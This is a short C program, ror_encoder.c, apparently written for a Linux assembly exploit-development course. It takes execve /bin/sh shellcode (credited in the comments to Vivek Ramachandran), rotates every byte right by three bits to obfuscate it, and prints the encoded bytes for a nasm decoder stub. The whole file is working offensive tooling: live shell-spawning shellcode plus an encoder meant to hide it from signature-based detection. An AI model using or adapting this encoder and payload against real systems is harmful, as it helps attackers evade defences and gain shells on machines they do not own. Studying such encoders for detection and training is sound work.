#include<stdio.h>
#include<string.h>

/* 	ror_encoder.c
	Written by John Pierce, CISSP remsanattexascarverdotcom
	Purpose:  Encode opcodes of shellcode for obfuscation purposes.

	Insert shellcode in place of code[] below, specify a value for r,
	that being how far to rotate.  Review shellcode
	and select a value that doesn't appear.  Add this value to the end
	of the shellcode to use as a marker for the end of code.  In the 
	following code, the marker is 0xaa.  Compile and run.
	Output is in the format for db declaration within nasm decoder.

The bytecodes below
are shellcode to execute execve from the stack and was
written by Vivek Ramachandran of Securitytube as part of
his course in Linux assembly language programming.
Info: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

This program was written by John W. Pierce, CISSP.  I enter it into
the public domain.  You are free to use and/or redistribute it without 
restriction, though attribution would be the right thing to do.  I hope
it is of some value, but I make ABSOLUTELY NO WARRANTY OF ANY KIND.


*/


unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\xaa";

main()
{
int	i;	// position in shellcode string
int	r = 3;	// rotate byte by [1-7] (0 or 8 are in effect no rotation)	

	for (i=0; i<strlen(code); i++) {
		code[i] = (code[i] >> r) | (code[i] << (8-r));	// ror method
	}

	for (i=0; i<strlen(code); i++) { 	// output in nasm format
		printf("0x%02x,", code[i]);
	}
	
	printf("\n\n");

	for (i=0; i<strlen(code); i++) {	// output in alternate format
		printf("\\x%02x", code[i]);
	}
	
	printf("\n\nShellcode Length:  %d\n", strlen(code));
	printf("ROR by %d\n", r);
}

	
